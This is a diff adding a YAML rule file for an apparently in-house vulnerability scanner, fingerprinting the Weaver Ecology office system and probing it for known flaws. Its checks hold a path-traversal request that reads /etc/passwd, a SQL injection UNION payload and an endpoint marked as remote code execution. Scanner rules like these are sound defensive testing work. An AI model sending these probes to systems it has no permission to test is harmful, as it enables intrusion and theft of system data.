@@ -1,0 +1,41 @@
+# RayScan OA 检测规则 — 泛微-Ecology
+# 由 T3.3 规则外部化生成，加载器: wvs/modules/oa/rules_loader.py
+# 字段说明见 rules/README.md 与 docs/OA_RULES.md
+# 注意: evidence/max_version 等字符串值必须加引号（防止 YAML 解析成数字）
+
+name: 泛微-Ecology
+paths:
+- /weaver/
+- /ecology/
+- /wui/
+keywords:
+- weaver
+- ecology
+- e-cology
+- eoffice
+fingerprints:
+- match: html
+  value: ecology
+- match: html
+  value: e-cology
+- match: html
+  value: weaver
+- match: html
+  value: eoffice
+checks:
+- path: /weaver/weaver.file.FileDownloadForOutDoc
+  params:
+    isFromOutDoc: 'true'
+    downloadFileId: ../../../../etc/passwd
+  type: lfi
+  severity: high
+  evidence: 'root:'
+- path: /api/portal/weaver/weaver.do
+  method: POST
+  type: rce
+  severity: critical
+- path: /workflow/WorkflowCenterTreeData.jsp
+  params:
+    nodeid: 1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+  type: sqli
+  severity: high
